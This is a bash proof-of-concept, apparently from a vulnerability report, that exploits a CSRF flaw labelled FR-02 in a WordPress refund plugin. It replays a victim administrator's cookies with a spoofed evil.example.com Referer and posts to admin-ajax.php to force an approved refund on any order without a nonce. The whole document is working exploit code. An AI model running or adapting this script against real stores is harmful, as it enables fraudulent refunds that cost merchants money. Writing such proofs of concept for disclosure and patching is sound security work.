#!/usr/bin/env bash
# FR-02 CSRF — forces an approved refund with no nonce. Models what the victim admin's browser sends.
# Use the VICTIM admin/shop_manager cookies (in a real attack the browser attaches them automatically).
set -euo pipefail
TARGET=${TARGET:-http://localhost:8088}
ADMIN_COOKIES=${ADMIN_COOKIES:-admin.cookies}
ORDER=${ORDER:-23}        # any order id
ITEM=${ITEM:-9}           # a line-item id of ORDER
curl -s -b "$ADMIN_COOKIES" -H 'Referer: https://evil.example.com/' \
  "$TARGET/wp-admin/admin-ajax.php?action=fr_refund_request" \
  --data-urlencode "order_ID=$ORDER" --data-urlencode "status=approved" \
  --data-urlencode "form=fr_refund_form%5Bitems%5D%5B$ITEM%5D%5Bqty%5D=1"
echo
# See csrf.html for the real-world auto-submitting page (no cookies needed in the PoC — the browser sends them).
